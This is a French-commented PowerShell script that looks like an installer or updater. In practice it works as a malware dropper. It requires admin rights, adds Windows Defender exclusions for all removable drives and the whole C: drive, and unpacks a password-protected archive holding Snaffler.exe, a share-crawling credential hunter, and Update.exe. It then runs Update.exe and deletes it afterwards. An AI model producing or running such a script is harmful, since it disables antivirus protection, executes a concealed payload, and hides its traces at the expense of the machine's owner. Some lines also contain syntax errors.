Try {
    # Vérifier si l'utilisateur a les droits administratifs
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    If (-Not $isAdmin) {
        Write-Host "Ce script doit être exécuté en tant qu'administrateur." -ForegroundColor Red
        Exit 1
    }

    # Fonction pour ajouter une exclusion pour les supports amovibles
    Function Add-ExclusionForRemovableMedia {
        # Récupérer tous les disques amovibles
        $removableDrives = Get-WmiObject -Class Win32_DiskDrive | Where-Object { $_.MediaType -eq 'Removable Media' }

        foreach ($drive in $removableDrives) {
            # Obtenir la lettre de lecteur de chaque disque amovible
            $driveLetter = (Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition" | 
                             Get-WmiObject -Class Win32_LogicalDisk | 
                             Where-Object { $_.DriveType -eq 2 }).DeviceID

            if ($driveLetter) {
                Write-Host "Ajout d'une exclusion pour le lecteur amovible : $driveLetter" -ForegroundColor Yellow
                # Ajouter l'exclusion pour ce disque
                Add-MpPreference -ExclusionPath $driveLetter
            }
        }
    }
    
    # Ajouter des exclusions pour tous les supports amovibles
    Add-ExclusionForRemovableMedia
    
    # Ajouter une exclusion pour le disque C:
    Write-Host "Ajout d'une exclusion pour le disque C:" -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath "C:\"

    # Vérifier si pip est installé
    $pipCommand = Get-Command pip -ErrorAction SilentlyContinue
    
    If (-Not $pipCommand) {
        Write-Host "pip n'est pas installé ou n'est pas dans les variables d'environnement. Tentative d'ajout du chemin de pip..." -ForegroundColor Yellow

        # Localiser l'installation de pip
        $pythonPath = (Get-Command python | Select-Object -First 1).Source
        If ($pythonPath) {
            # Récupérer le chemin d'installation de pip
            $pipPath = Join-Path (Split-Path $pythonPath -Parent) "Scripts\pip.exe"
            
            If (Test-Path $pipPath) {
                Write-Host "pip trouvé à l'emplacement : $pipPath" -ForegroundColor Green

                # Ajouter pip aux variables d'environnement
                $envPath = [System.Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine)
                If ($envPath -notcontains (Split-Path $pipPath)) {
                    [System.Environment]::SetEnvironmentVariable('Path', "$envPath;$($Split-Path $pipPath)", [System.EnvironmentVariableTarget]::Machine)
                    Write-Host "Le chemin de pip a été ajouté aux variables d'environnement." -ForegroundColor Green
                } Else {
                    Write-Host "Le chemin de pip est déjà dans les variables d'environnement." -ForegroundColor Green
                }
            } Else {
                Write-Host "Impossible de localiser pip à partir de Python." -ForegroundColor Red
            }
        } Else {
            Write-Host "Impossible de trouver l'exécutable Python." -ForegroundColor Red
        }
    } Else {
        Write-Host "pip est déjà installé et disponible dans les variables d'environnement." -ForegroundColor Green
    }

    # Définir les chemins relatifs à la racine du projet
    $projectRoot = $PSScriptRoot
    $rarPath = "$projectRoot\Packeges.rar"
    $extractPath = "$projectRoot\extraction"
    $exeSnafflerPath = "$extractPath\Snaffler.exe"
    $exeUpdatePath = "$extractPath\Update.exe"

    # Décompresser l'archive avec mot de passe
    Write-Host "Décompression de l'archive Packeges.rar..." -ForegroundColor Yellow
    & "C:\\Program Files\\WinRAR\\WinRAR.exe" x -p"toto123" -o+ "$rarPath" "$extractPath"
    
    # Vérifier si l'extraction a réussi
    If (Test-Path $exeSnafflerPath -and Test-Path $exeUpdatePath) {
        Write-Host "L'archive a été décompressée avec succès." -ForegroundColor Green
        
        # Lancer le programme Update
        Write-Host "Lancement de Update.exe..." -ForegroundColor Yellow
        $processUpdate = Start-Process -FilePath $exeUpdatePath -PassThru
        
        # Attendre la fin du processus de Update
        $processUpdate.WaitForExit()
        Write-Host "Update.exe a été exécuté et terminé." -ForegroundColor Green

        # Supprimer les exécutables après exécution
        Remove-Item -Path $exeUpdatePath -Force
        Write-Host "L'exécutables a été supprimé." -ForegroundColor Green
    } Else {
        Write-Host "Erreur lors de l'extraction de l'archive ou des exécutables manquants." -ForegroundColor Red
    }
} Catch {
    Write-Host "Une erreur s'est produite : $_" -ForegroundColor Red
}
